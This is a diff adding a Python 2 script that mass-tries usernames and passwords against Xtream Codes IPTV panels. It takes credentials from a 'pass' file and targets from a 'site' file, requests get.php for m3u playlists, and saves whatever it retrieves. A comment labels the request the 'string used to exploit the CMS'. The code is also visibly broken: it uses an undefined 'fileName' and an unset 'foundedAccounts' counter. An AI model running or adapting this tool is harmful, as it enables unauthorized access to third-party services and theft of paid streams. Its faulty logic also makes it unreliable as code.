@@ -1,0 +1,139 @@
+#!/usr/bin/env python
+import os
+import sys
+import time
+import pyprind
+import urllib2
+
+
+
+
+f_pass= "pass"
+f_site= "site"
+os.system("clear")
+pth= "get.php?username=@&password=@&type=m3u"
+wget = ["wget" , "-nd", "-q", "-np", "-c", "-r"]
+
+children = {}
+maxjobs = 8
+jobs = [] 
+global fileLength
+outputDir = "output"
+class Crawler(object):
+    # version
+    version = "1.2.3"
+    # output default directory
+    
+    # language default directory
+    languageDir = "languages"
+    # string used to exploit the CMS
+    basicString = "/get.php?username=%s&password=%s&type=m3u&output=mpegts"
+    # string used to search the CMS
+    searchString = "Xtream Codes v1.0.59.5"
+
+def spawn(cmd, *args):
+    argv = [cmd] + list(args)
+    pid = None
+    try:
+        pid = os.spawnlp(os.P_NOWAIT, cmd, *argv)
+        children[pid] = {'pid': pid, 'cmd': argv}
+    except Exception, inst:
+        print "'%s': %s" % ("\x20".join(argv), str(inst))
+    print "spawned pid %d of nproc=%d njobs=%d for '%s'" % \
+        (pid, len(children), len(jobs), "\x20".join(argv))
+    return pid
+
+
+def r_pass ():
+	try:
+		
+		for p in file(f_pass).readlines():
+			fileLength = file_length(fileName)
+			pass_1=p.strip('\r\n')
+			#print pass_1
+			r_site (pass_1)
+			
+
+	except IOError:
+		pass
+
+def r_site (pass_w):
+
+	try:
+		for u in file(f_site).readlines():
+			u1= u.strip('\r\n')
+			u2= u1.replace("http://", "")
+			u2= u2.replace(":", "")
+			url= u.strip('\r\n') + pth 
+			url_f= url.replace("@", pass_w)
+			cmd = wget + [url_f]
+			jobs.append(cmd)
+			#print url_f
+			parrs (url_f, u2 )
+			
+	except IOError:
+		pass
+			
+
+def parrs (inj, url_s):
+	try:
+		
+		opener = urllib2.build_opener()
+		opener.addheaders = [('User-agent', 'Mozilla/5.0')]
+		print inj.rstrip().lstrip()
+		response = opener.open(inj.rstrip().lstrip(), timeout=4)
+		fetched = response.read()
+		if len(fetched) > 0:
+			#print fetched
+			newPath = outputDir + "/" + url_s.replace("http://", "")
+			print newPath
+			create_file(inj, newPath, fetched)
+
+	except IOError:
+		return "Cannot open the current Language file. Try another one"
+	except urllib2.HTTPError, e:
+		return "Ops, HTTPError exception here. Cannot fetch the current URL " + str(e.code)
+	except urllib2.URLError, e:
+		return "Ops, the URL seems broken." + str(e.reason)
+	except Exception:
+		return "Ops something went wrong!"
+
+
+
+def file_length(fileName):
+        """File Length
+        Cheapest way to calculate the rows of a file
+
+        Keyword arguments:
+        fileName -- string the filename into which we will check its Length
+        """
+        with open(f_pass) as f:
+            for i, l in enumerate(f):
+                pass
+        return i + 1
+def create_file( row, newPath, fetched):
+
+        if os.path.exists(newPath) is False:
+            os.makedirs(newPath)
+        outputFile = open(str(newPath) + "/tv_channels_.m3u", "w")
+        outputFile.write(fetched)
+        foundedAccounts = foundedAccounts + 1
+        outputFile.close()
+
+      
+
+
+
+
+
+
+
+
+if __name__ == "__main__":
+	fileLength = file_length(f_pass)
+	#r_site()
+	r_pass ()
+	#print len(jobs)
+	#print jobs
+
+	
